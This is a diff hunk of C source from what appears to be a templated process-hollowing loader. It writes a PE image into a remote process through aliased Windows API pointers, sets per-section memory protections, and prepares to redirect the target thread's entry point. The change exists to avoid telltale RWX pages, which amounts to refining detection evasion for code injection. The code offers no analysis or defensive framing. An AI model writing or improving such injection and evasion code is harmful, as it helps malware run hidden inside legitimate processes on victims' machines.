@@ -689,11 +689,25 @@ static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
             rel=(IMAGE_BASE_RELOCATION*)((UCHAR*)rel+rel->SizeOfBlock);
         }
     }
-    /* Write image to remote, then flip to RX — no persistent RWX page */
+    /* Write image to remote process */
     SIZE_T wr=0; g_WPM(pi.hProcess,rem,img,imgSz,&wr);
     g_VF(img,0,MEM_RELEASE);
-    DWORD oldProt=0;
-    g_VPEx(pi.hProcess,rem,imgSz,PAGE_EXECUTE_READ,&oldProt);
+    /* Apply per-section protections based on PE characteristics — avoids persistent RWX */
+    {
+        IMAGE_SECTION_HEADER* sh=(IMAGE_SECTION_HEADER*)((UCHAR*)nt+sizeof(IMAGE_NT_HEADERS64));
+        for(int i=0;i<nt->FileHeader.NumberOfSections;i++){
+            if(!sh[i].VirtualAddress) continue;
+            DWORD ch=sh[i].Characteristics;
+            int xe=(ch&0x20000000)!=0, xr=(ch&0x40000000)!=0, xw=(ch&0x80000000)!=0;
+            DWORD prot= (xe&&xw)?PAGE_EXECUTE_READWRITE:
+                        (xe&&xr)?PAGE_EXECUTE_READ:
+                        xe       ?PAGE_EXECUTE:
+                        xw       ?PAGE_READWRITE:
+                                  PAGE_READONLY;
+            DWORD op=0; DWORD vsz=sh[i].Misc.VirtualSize?sh[i].Misc.VirtualSize:sh[i].SizeOfRawData;
+            g_VPEx(pi.hProcess,(LPVOID)(remBase+sh[i].VirtualAddress),vsz,prot,&op);
+        }
+    }
     /* Update PEB.ImageBase and redirect entry point */
     CONTEXT ctx; memset(&ctx,0,sizeof(ctx)); ctx.ContextFlags=CONTEXT_FULL;
     if (!g_GTC(pi.hThread,&ctx)) {
